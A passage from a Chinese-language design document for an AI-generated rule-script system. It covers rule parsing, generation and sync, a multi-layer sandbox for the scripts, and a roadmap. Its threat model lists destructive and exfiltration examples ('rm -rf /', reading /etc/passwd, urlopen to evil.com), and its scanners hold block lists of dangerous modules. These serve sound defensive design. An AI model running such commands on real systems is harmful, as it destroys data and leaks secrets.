│                         ▼                                   │
│  Step 3: 用户 Review                                        │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ 在 Task Viewer 中展示生成的规则脚本:                    ││
│  │                                                         ││
│  │ 📄 rules/trace_id_check.py                              ││
│  │ 📄 rules/error_handler_check.py                         ││
│  │ 📄 rules/sensitive_data_in_log.py                       ││
│  │                                                         ││
│  │ 用户可以:                                               ││
│  │ • 查看生成的规则脚本                                   ││
│  │ • 修改规则逻辑                                         ││
│  │ • 添加/删除检查条件                                    ││
│  │ • 调整严重程度                                         ││
│  └─────────────────────────────────────────────────────────┘│
│                         │                                   │
│                         ▼                                   │
│  触发点 2: plan.md 业务规则变更                              │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ 用户修改了 plan.md 中的业务规则描述                     ││
│  └─────────────────────────────────────────────────────────┘│
│                         │                                   │
│                         ▼                                   │
│  Step 4: 同步检测                                           │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ Nomos SKILL 检测到 plan.md 变更:                        ││
│  │                                                         ││
│  │ old_rules = parse_rules(old_plan_md)                    ││
│  │ new_rules = parse_rules(new_plan_md)                    ││
│  │                                                         ││
│  │ diff = compare_rules(old_rules, new_rules)              ││
│  │                                                         ││
│  │ for changed_rule in diff.changed:                       ││
│  │     regenerate_script(changed_rule)                     ││
│  │     notify_user("规则已更新，请 review")                ││
│  │                                                         ││
│  │ for deleted_rule in diff.deleted:                       ││
│  │     delete_script(deleted_rule)                         ││
│  │     notify_user("规则已删除")                           ││
│  │                                                         ││
│  │ for added_rule in diff.added:                           ││
│  │     generate_script(added_rule)                         ││
│  │     notify_user("新规则已生成，请 review")              ││
│  └─────────────────────────────────────────────────────────┘│
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 3.2 规则解析算法

```python
def parse_business_rules(plan_content: str) -> List[RuleSpec]:
    """
    从 plan.md 中解析业务规则

    Args:
        plan_content: plan.md 内容

    Returns:
        规则规范列表
    """
    # 1. 提取业务规则章节
    rules_section = extract_section(plan_content, "## 业务规则")
    if not rules_section:
        return []

    # 2. 调用 AI 解析规则
    prompt = f"""
解析以下业务规则描述，提取结构化信息。

业务规则:
{rules_section}

返回 JSON 格式:
{{
  "rules": [
    {{
      "index": 1,
      "description": "所有 API 返回必须带 trace_id",
      "handler_type": "command",  // "command" 或 "prompt"
      "severity": "error",  // "error", "warning", "info"
      "target_files": ["src/api/**/*.py"],
      "reasoning": "可以用 AST 静态检查返回值"
    }}
  ]
}}
"""

    ai_client = AIClient()
    result = ai_client.call(prompt, rules_section, max_tokens=2048)

    # 3. 转换为 RuleSpec 对象
    rule_specs = []
    for rule_data in result.get("rules", []):
        rule_specs.append(RuleSpec(
            index=rule_data["index"],
            description=rule_data["description"],
            handler_type=rule_data["handler_type"],
            severity=rule_data["severity"],
            target_files=rule_data.get("target_files", []),
            reasoning=rule_data.get("reasoning", "")
        ))

    return rule_specs
```

### 3.3 规则生成算法

```python
def generate_rule_script(rule_spec: RuleSpec, task_info: TaskInfo) -> str:
    """
    生成规则脚本

    Args:
        rule_spec: 规则规范
        task_info: 任务信息

    Returns:
        生成的 Python 脚本
    """
    # 1. 选择模板
    if rule_spec.handler_type == "command":
        template_prompt = COMMAND_HANDLER_GENERATION_PROMPT
    else:
        template_prompt = PROMPT_HANDLER_GENERATION_PROMPT

    # 2. 填充模板变量
    prompt = template_prompt.format(
        task_id=task_info.task_id,
        task_dir=task_info.task_dir,
        project_root=task_info.project_root,
        actual_rule_description=rule_spec.description
    )

    # 3. 调用 AI 生成脚本
    ai_client = AIClient()
    script = ai_client.call(prompt, "", max_tokens=4096)

    # 4. 提取 Python 代码块
    import re
    code_match = re.search(r'```python\s*([\s\S]*?)\s*```', script)
    if code_match:
        return code_match.group(1)
    else:
        return script  # 如果没有代码块，直接返回

def save_rule_script(script: str, rule_name: str, task_dir: str):
    """
    保存规则脚本到 task 目录

    Args:
        script: 脚本内容
        rule_name: 规则名称
        task_dir: task 目录
    """
    rules_dir = Path(task_dir) / "rules"
    rules_dir.mkdir(exist_ok=True)

    script_path = rules_dir / f"{rule_name}.py"
    script_path.write_text(script, encoding='utf-8')

    print(f"✅ 规则脚本已生成: {script_path}")
```

### 3.4 规则同步算法

```python
def sync_rules_on_plan_change(old_plan: str, new_plan: str, task_dir: str):
    """
    plan.md 变更时同步规则脚本

    Args:
        old_plan: 旧的 plan.md 内容
        new_plan: 新的 plan.md 内容
        task_dir: task 目录
    """
    # 1. 解析新旧规则
    old_rules = parse_business_rules(old_plan)
    new_rules = parse_business_rules(new_plan)

    # 2. 计算差异
    diff = compute_rule_diff(old_rules, new_rules)

    # 3. 处理新增规则
    for added_rule in diff.added:
        script = generate_rule_script(added_rule, task_info)
        save_rule_script(script, added_rule.name, task_dir)
        notify_user(f"🆕 新规则已生成: {added_rule.name}.py，请 review")

    # 4. 处理修改规则
    for changed_rule in diff.changed:
        # 检查用户是否手动修改过脚本
        script_path = Path(task_dir) / "rules" / f"{changed_rule.name}.py"
        if script_path.exists():
            if has_user_modifications(script_path):
                # 用户修改过，询问是否覆盖
                if ask_user_confirm(f"规则 {changed_rule.name} 已被修改，是否重新生成？"):
                    script = generate_rule_script(changed_rule, task_info)
                    save_rule_script(script, changed_rule.name, task_dir)
                    notify_user(f"🔄 规则已更新: {changed_rule.name}.py")
                else:
                    notify_user(f"⏭️  跳过规则: {changed_rule.name}.py")
            else:
                # 用户未修改，直接重新生成
                script = generate_rule_script(changed_rule, task_info)
                save_rule_script(script, changed_rule.name, task_dir)
                notify_user(f"🔄 规则已更新: {changed_rule.name}.py")

    # 5. 处理删除规则
    for deleted_rule in diff.deleted:
        script_path = Path(task_dir) / "rules" / f"{deleted_rule.name}.py"
        if script_path.exists():
            script_path.unlink()
            notify_user(f"🗑️  规则已删除: {deleted_rule.name}.py")

def has_user_modifications(script_path: Path) -> bool:
    """
    检查脚本是否被用户修改过

    通过检查脚本头部的 "Auto-generated" 注释和生成时间戳
    """
    content = script_path.read_text(encoding='utf-8')

    # 提取生成时间戳
    import re
    match = re.search(r'# Generated: (.+)', content)
    if not match:
        return True  # 没有时间戳，认为是用户修改过

    generated_time = match.group(1)

    # 检查文件修改时间
    import os
    from datetime import datetime
    file_mtime = datetime.fromtimestamp(os.path.getmtime(script_path))
    generated_dt = datetime.strptime(generated_time, "%Y-%m-%d %H:%M")

    # 如果文件修改时间晚于生成时间 5 分钟以上，认为是用户修改过
    return (file_mtime - generated_dt).total_seconds() > 300
```

---

## 4. 安全沙箱的实现方案

### 4.1 安全威胁分析

```
┌─────────────────────────────────────────────────────────────┐
│                    动态规则脚本的安全威胁                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  威胁 1: 恶意代码注入                                       │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ • 用户手动修改脚本，注入恶意代码                        ││
│  │ • AI 生成的脚本包含危险操作                             ││
│  │ • 示例: import os; os.system("rm -rf /")                ││
│  └─────────────────────────────────────────────────────────┘│
│                                                             │
│  威胁 2: 文件系统访问                                       │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ • 读取敏感文件 (密钥、配置)                             ││
│  │ • 修改项目文件                                          ││
│  │ • 示例: open("/etc/passwd", "r")                        ││
│  └─────────────────────────────────────────────────────────┘│
│                                                             │
│  威胁 3: 网络访问                                           │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ • 发送数据到外部服务器                                  ││
│  │ • 下载恶意代码                                          ││
│  │ • 示例: urllib.request.urlopen("http://evil.com")       ││
│  └─────────────────────────────────────────────────────────┘│
│                                                             │
│  威胁 4: 进程执行                                           │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ • 执行系统命令                                          ││
│  │ • 启动子进程                                            ││
│  │ • 示例: subprocess.run(["rm", "-rf", "/"])              ││
│  └─────────────────────────────────────────────────────────┘│
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 4.2 多层防护策略

```
┌─────────────────────────────────────────────────────────────┐
│                    多层安全防护策略                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Layer 1: 静态代码扫描 (加载前)                             │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ • 正则匹配危险模式                                      ││
│  │ • 禁止 import os, subprocess, sys                       ││
│  │ • 禁止 eval(), exec(), __import__()                     ││
│  │ • 禁止 open() 文件操作                                  ││
│  └─────────────────────────────────────────────────────────┘│
│                         │                                   │
│                         ▼                                   │
│  Layer 2: AST 语法分析 (加载前)                             │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ • 解析 AST 树                                           ││
│  │ • 检查 import 语句                                      ││
│  │ • 检查函数调用                                          ││
│  │ • 检查属性访问                                          ││
│  └─────────────────────────────────────────────────────────┘│
│                         │                                   │
│                         ▼                                   │
│  Layer 3: 沙箱执行环境 (运行时)                             │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ • 限制 globals 命名空间                                 ││
│  │ • 只注入白名单模块                                      ││
│  │ • 禁用 __builtins__ 危险函数                            ││
│  └─────────────────────────────────────────────────────────┘│
│                         │                                   │
│                         ▼                                   │
│  Layer 4: 资源限制 (运行时)                                 │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ • 执行超时 (5 秒)                                       ││
│  │ • 内存限制 (100MB)                                      ││
│  │ • CPU 限制                                              ││
│  └─────────────────────────────────────────────────────────┘│
│                                                             │
└─────────────────────────────────────────────────────────────┘
```


### 4.3 详细实现

#### 4.3.1 静态代码扫描

```python
def static_code_scan(source: str) -> List[str]:
    """
    静态代码扫描 - 检测危险模式

    Args:
        source: 脚本源码

    Returns:
        检测到的威胁列表
    """
    threats = []

    # 危险模式列表
    dangerous_patterns = [
        (r"import\s+os\b", "禁止导入 os 模块"),
        (r"import\s+subprocess", "禁止导入 subprocess 模块"),
        (r"import\s+sys\b", "禁止导入 sys 模块"),
        (r"from\s+os\s+import", "禁止从 os 导入"),
        (r"from\s+subprocess\s+import", "禁止从 subprocess 导入"),
        (r"__import__", "禁止使用 __import__"),
        (r"\beval\s*\(", "禁止使用 eval()"),
        (r"\bexec\s*\(", "禁止使用 exec()"),
        (r"\bopen\s*\(", "禁止使用 open()"),
        (r"\bcompile\s*\(", "禁止使用 compile()"),
        (r"__builtins__", "禁止访问 __builtins__"),
        (r"globals\s*\(", "禁止使用 globals()"),
        (r"locals\s*\(", "禁止使用 locals()"),
    ]

    for pattern, message in dangerous_patterns:
        if re.search(pattern, source):
            threats.append(message)

    return threats
```

#### 4.3.2 AST 语法分析

```python
import ast

class SecurityASTVisitor(ast.NodeVisitor):
    """安全 AST 访问器 - 检测危险操作"""

    def __init__(self):
        self.threats = []

    def visit_Import(self, node):
        """检查 import 语句"""
        for alias in node.names:
            if alias.name in ["os", "subprocess", "sys", "socket", "urllib"]:
                self.threats.append(f"禁止导入模块: {alias.name}")
        self.generic_visit(node)

    def visit_ImportFrom(self, node):
        """检查 from ... import 语句"""
        if node.module in ["os", "subprocess", "sys", "socket", "urllib"]:
            self.threats.append(f"禁止从模块导入: {node.module}")
        self.generic_visit(node)

    def visit_Call(self, node):
        """检查函数调用"""
        # 检查危险函数
        if isinstance(node.func, ast.Name):
            if node.func.id in ["eval", "exec", "compile", "open", "__import__"]:
                self.threats.append(f"禁止调用函数: {node.func.id}")

        # 检查属性访问
        if isinstance(node.func, ast.Attribute):
            if node.func.attr in ["system", "popen", "spawn"]:
                self.threats.append(f"禁止调用方法: {node.func.attr}")

        self.generic_visit(node)

    def visit_Attribute(self, node):
        """检查属性访问"""
        if node.attr in ["__builtins__", "__globals__", "__code__"]:
            self.threats.append(f"禁止访问属性: {node.attr}")
        self.generic_visit(node)


def ast_security_check(source: str) -> List[str]:
    """
    AST 安全检查

    Args:
        source: 脚本源码

    Returns:
        检测到的威胁列表
    """
    try:
        tree = ast.parse(source)
        visitor = SecurityASTVisitor()
        visitor.visit(tree)
        return visitor.threats
    except SyntaxError:
        return ["语法错误"]
```

#### 4.3.3 沙箱执行环境

```python
def create_sandbox_globals() -> Dict[str, Any]:
    """
    创建沙箱执行环境

    Returns:
        受限的 globals 命名空间
    """
    # 1. 创建受限的 builtins
    safe_builtins = {
        # 允许的内置函数
        "abs": abs,
        "all": all,
        "any": any,
        "bool": bool,
        "dict": dict,
        "enumerate": enumerate,
        "filter": filter,
        "float": float,
        "int": int,
        "isinstance": isinstance,
        "issubclass": issubclass,
        "len": len,
        "list": list,
        "map": map,
        "max": max,
        "min": min,
        "range": range,
        "reversed": reversed,
        "set": set,
        "sorted": sorted,
        "str": str,
        "sum": sum,
        "tuple": tuple,
        "type": type,
        "zip": zip,

        # 允许的异常
        "Exception": Exception,
        "ValueError": ValueError,
        "TypeError": TypeError,
        "KeyError": KeyError,
        "IndexError": IndexError,

        # 禁止的函数 (设为 None)
        "eval": None,
        "exec": None,
        "compile": None,
        "open": None,
        "__import__": None,
        "globals": None,
        "locals": None,
    }

    # 2. 注入白名单模块
    sandbox_globals = {
        "__builtins__": safe_builtins,

        # 注入 l3_foundation 基础能力
        "BaseRule": BaseRule,
        "RuleViolation": RuleViolation,
        "Severity": Severity,
        "AIClient": AIClient,
        "ASTUtils": ASTUtils,
        "PromptBuilder": PromptBuilder,
        "RuleContext": RuleContext,

        # 允许的标准库模块
        "re": re,
        "json": json,
        "ast": ast,
    }

    return sandbox_globals


def execute_in_sandbox(source: str, script_path: str) -> Dict[str, Any]:
    """
    在沙箱中执行脚本

    Args:
        source: 脚本源码
        script_path: 脚本路径

    Returns:
        执行后的命名空间

    Raises:
        SecurityError: 检测到安全威胁
        TimeoutError: 执行超时
    """
    # 1. 静态扫描
    threats = static_code_scan(source)
    if threats:
        raise SecurityError(f"静态扫描检测到威胁: {', '.join(threats)}")

    # 2. AST 检查
    threats = ast_security_check(source)
    if threats:
        raise SecurityError(f"AST 检查检测到威胁: {', '.join(threats)}")

    # 3. 创建沙箱环境
    sandbox_globals = create_sandbox_globals()

    # 4. 编译代码
    try:
        code = compile(source, str(script_path), "exec")
    except SyntaxError as e:
        raise SecurityError(f"语法错误: {e}")

    # 5. 执行代码 (带超时)
    import signal

    def timeout_handler(signum, frame):
        raise TimeoutError("脚本执行超时")

    # 设置 5 秒超时
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(5)

    try:
        exec(code, sandbox_globals)
    finally:
        signal.alarm(0)  # 取消超时

    return sandbox_globals
```

#### 4.3.4 资源限制

```python
import resource

def set_resource_limits():
    """
    设置资源限制

    限制:
    - 内存: 100MB
    - CPU 时间: 5 秒
    - 文件大小: 0 (禁止创建文件)
    """
    # 内存限制 (100MB)
    resource.setrlimit(resource.RLIMIT_AS, (100 * 1024 * 1024, 100 * 1024 * 1024))

    # CPU 时间限制 (5 秒)
    resource.setrlimit(resource.RLIMIT_CPU, (5, 5))

    # 禁止创建文件
    resource.setrlimit(resource.RLIMIT_FSIZE, (0, 0))

    # 禁止创建子进程
    resource.setrlimit(resource.RLIMIT_NPROC, (0, 0))
```

### 4.4 完整的安全加载流程

```python
class SecureDynamicRuleLoader:
    """安全的动态规则加载器"""

    def load_from_task(self, task_dir: str) -> List[BaseRule]:
        """
        从 task 目录安全加载所有规则

        Args:
            task_dir: task 目录路径

        Returns:
            规则实例列表
        """
        rules_dir = Path(task_dir) / "rules"
        if not rules_dir.exists():
            return []

        rules = []
        for script_path in rules_dir.glob("*.py"):
            try:
                loaded_rules = self._load_script_securely(script_path)
                if loaded_rules:
                    rules.extend(loaded_rules)
            except SecurityError as e:
                print(f"🚨 安全威胁: {script_path}: {e}")
            except TimeoutError:
                print(f"⏱️  执行超时: {script_path}")
            except Exception as e:
                print(f"⚠️  加载失败: {script_path}: {e}")

        return rules

    def _load_script_securely(self, script_path: Path) -> List[BaseRule]:
        """
        安全加载单个脚本

        Args:
            script_path: 脚本路径

        Returns:
            规则实例列表

        Raises:
            SecurityError: 检测到安全威胁
            TimeoutError: 执行超时
        """
        # 1. 读取脚本内容
        source = script_path.read_text(encoding='utf-8')

        # 2. 在沙箱中执行
        sandbox_globals = execute_in_sandbox(source, script_path)

        # 3. 提取所有 BaseRule 子类
        rules = []
        for name, obj in sandbox_globals.items():
            if (isinstance(obj, type) and
                issubclass(obj, BaseRule) and
                obj is not BaseRule):
                # 实例化规则
                try:
                    rule_instance = obj()
                    rules.append(rule_instance)
                except Exception as e:
                    print(f"⚠️  规则实例化失败: {name}: {e}")

        return rules


class SecurityError(Exception):
    """安全错误"""
    pass
```

### 4.5 安全建议

```
┌─────────────────────────────────────────────────────────────┐
│                    安全最佳实践                              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 代码审查                                                │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ • 所有生成的规则脚本必须经过用户 review                 ││
│  │ • 在 Task Viewer 中高亮显示新生成的脚本                 ││
│  │ • 提供脚本 diff 功能，方便用户对比变更                  ││
│  └─────────────────────────────────────────────────────────┘│
│                                                             │
│  2. 权限最小化                                              │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ • 规则脚本只能访问 l3_foundation 提供的能力             ││
│  │ • 禁止访问文件系统、网络、进程                          ││
│  │ • 禁止使用反射和动态代码执行                            ││
│  └─────────────────────────────────────────────────────────┘│
│                                                             │
│  3. 隔离执行                                                │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ • 每个规则脚本在独立的沙箱中执行                        ││
│  │ • 设置资源限制 (内存、CPU、时间)                        ││
│  │ • 捕获并记录所有异常                                    ││
│  └─────────────────────────────────────────────────────────┘│
│                                                             │
│  4. 审计日志                                                │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ • 记录所有规则脚本的加载和执行                          ││
│  │ • 记录安全威胁检测结果                                  ││
│  │ • 记录用户修改历史                                      ││
│  └─────────────────────────────────────────────────────────┘│
│                                                             │
│  5. 版本控制                                                │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ • 规则脚本纳入 git 版本控制                             ││
│  │ • 每次生成/修改都创建 commit                            ││
│  │ • 支持回滚到历史版本                                    ││
│  └─────────────────────────────────────────────────────────┘│
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 5. 实施路线图

### 5.1 Phase 1: 基础能力层 (5-10m)

```
┌─────────────────────────────────────────────────────────────┐
│                    Phase 1: 基础能力层                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  目标: 实现 l3_foundation 基础能力层                         │
│                                                             │
│  任务清单:                                                  │
│  ☐ 创建 .claude/hooks/lib/l3_foundation/ 目录              │
│  ☐ 实现 base_rule.py (BaseRule, RuleViolation, Severity)   │
│  ☐ 实现 ai_client.py (AIClient)                            │
│  ☐ 实现 ast_utils.py (ASTUtils)                            │
│  ☐ 实现 prompt_builder.py (PromptBuilder)                  │
│  ☐ 实现 rule_context.py (RuleContext)                      │
│  ☐ 实现 rule_loader.py (DynamicRuleLoader)                 │
│  ☐ 实现 __init__.py (统一导出)                             │
│  ☐ 编写单元测试                                            │
│                                                             │
│  验收标准:                                                  │
│  ✅ 所有模块可以正常导入                                    │
│  ✅ AIClient 可以调用 AI                                    │
│  ✅ ASTUtils 可以解析 Python 代码                           │
│  ✅ DynamicRuleLoader 可以加载脚本                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 5.2 Phase 2: 规则生成 (10-15m)

```
┌─────────────────────────────────────────────────────────────┐
│                    Phase 2: 规则生成                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  目标: 实现 Nomos SKILL 规则生成功能                         │
│                                                             │
│  任务清单:                                                  │
│  ☐ 设计规则生成 Prompt                                      │
│  ☐ 实现 parse_business_rules() 解析算法                    │
│  ☐ 实现 generate_rule_script() 生成算法                    │
│  ☐ 实现 save_rule_script() 保存逻辑                        │
│  ☐ 集成到 Nomos SKILL                                       │
│  ☐ 在 Task Viewer 中展示生成的脚本                          │
│  ☐ 测试生成的脚本是否可执行                                │
│                                                             │
│  验收标准:                                                  │
│  ✅ 可以从 plan.md 解析业务规则                             │
│  ✅ 可以生成 Command Handler 脚本                           │
│  ✅ 可以生成 Prompt Handler 脚本                            │
│  ✅ 生成的脚本可以正常加载和执行                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 5.3 Phase 3: 规则同步 (5-10m)

```
┌─────────────────────────────────────────────────────────────┐
│                    Phase 3: 规则同步                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  目标: 实现 plan.md 变更时的规则同步                         │
│                                                             │
│  任务清单:                                                  │
│  ☐ 实现 compute_rule_diff() 差异计算                       │
│  ☐ 实现 sync_rules_on_plan_change() 同步逻辑               │
│  ☐ 实现 has_user_modifications() 检测用户修改              │
│  ☐ 实现 ask_user_confirm() 用户确认                        │
│  ☐ 集成到 plan.md 保存流程                                  │
│  ☐ 测试同步逻辑                                            │
│                                                             │
│  验收标准:                                                  │
│  ✅ plan.md 变更时自动检测规则差异                          │
│  ✅ 新增规则自动生成脚本                                    │
│  ✅ 修改规则自动更新脚本 (用户确认)                         │
│  ✅ 删除规则自动删除脚本                                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 5.4 Phase 4: 安全沙箱 (10-15m)

```
┌─────────────────────────────────────────────────────────────┐
│                    Phase 4: 安全沙箱                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  目标: 实现安全沙箱执行环境                                  │
│                                                             │
│  任务清单:                                                  │
│  ☐ 实现 static_code_scan() 静态扫描                        │
│  ☐ 实现 ast_security_check() AST 检查                      │
│  ☐ 实现 create_sandbox_globals() 沙箱环境                  │
│  ☐ 实现 execute_in_sandbox() 沙箱执行                      │
│  ☐ 实现 set_resource_limits() 资源限制                     │
│  ☐ 实现 SecureDynamicRuleLoader 安全加载器                 │
│  ☐ 测试安全防护机制                                        │
│                                                             │
│  验收标准:                                                  │
│  ✅ 可以检测并阻止危险代码                                  │
│  ✅ 规则脚本在沙箱中执行                                    │
│  ✅ 资源限制生效 (内存、CPU、时间)                          │
│  ✅ 恶意脚本无法破坏系统                                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 5.5 Phase 5: 集成测试 (5m)

```
┌─────────────────────────────────────────────────────────────┐
│                    Phase 5: 集成测试                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  目标: 端到端测试整个流程                                    │
│                                                             │
│  测试场景:                                                  │
│  ☐ 场景 1: 创建新 task，编写 plan.md，生成规则脚本         │
│  ☐ 场景 2: 修改 plan.md 业务规则，同步更新脚本             │
│  ☐ 场景 3: 用户手动修改脚本，plan.md 变更时提示确认        │
│  ☐ 场景 4: 删除 plan.md 业务规则，删除对应脚本             │
│  ☐ 场景 5: PreToolUse Hook 加载并执行规则脚本              │
│  ☐ 场景 6: 恶意脚本被安全沙箱阻止                          │
│                                                             │
│  验收标准:                                                  │
│  ✅ 所有场景测试通过                                        │
│  ✅ 性能满足要求 (规则加载 < 1s)                            │
│  ✅ 用户体验流畅                                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 6. 总结

### 6.1 核心优势

```
┌─────────────────────────────────────────────────────────────┐
│                    动态规则系统的核心优势                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ✅ 完全定制化                                              │
│     • 满足任何项目特定的业务规则需求                        │
│     • 不受预制规则限制                                      │
│                                                             │
│  ✅ 用户可控                                                │
│     • 用户可以 review 和修改生成的规则                      │
│     • 支持手动调整规则逻辑                                  │
│                                                             │
│  ✅ 基础能力复用                                            │
│     • 统一的 l3_foundation 层                               │
│     • AIClient、ASTUtils 等工具开箱即用                     │
│                                                             │
│  ✅ 规则与任务绑定                                          │
│     • 规则存储在 task 目录                                  │
│     • 不同任务的规则互不干扰                                │
│                                                             │
│  ✅ 自动同步                                                │
│     • plan.md 变更时自动更新规则                            │
│     • 减少手动维护成本                                      │
│                                                             │
│  ✅ 安全可靠                                                │
│     • 多层安全防护                                          │
│     • 沙箱执行环境                                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 6.2 与预制规则的对比

| 维度 | 预制规则 | 动态规则 |
|------|---------|---------|
| **定制能力** | ❌ 受限 | ✅ 完全定制 |
| **用户可控** | ❌ 只能改配置 | ✅ 可改脚本 |
| **维护成本** | ✅ 低 | ⚠️ 中 |
| **安全风险** | ✅ 低 | ⚠️ 需沙箱 |
| **适用场景** | 通用规则 | 项目特定规则 |
| **学习曲线** | ✅ 低 | ⚠️ 中 |

### 6.3 推荐策略

**混合模式**: 保留预制规则 + 支持动态规则

- **通用规则** (i18n, logger, module_isolation) → 使用预制规则
- **项目特定规则** (trace_id, error_handler, 业务逻辑) → 使用动态规则

这样既保留了预制规则的便利性，又提供了动态规则的灵活性。

---

**文档结束**

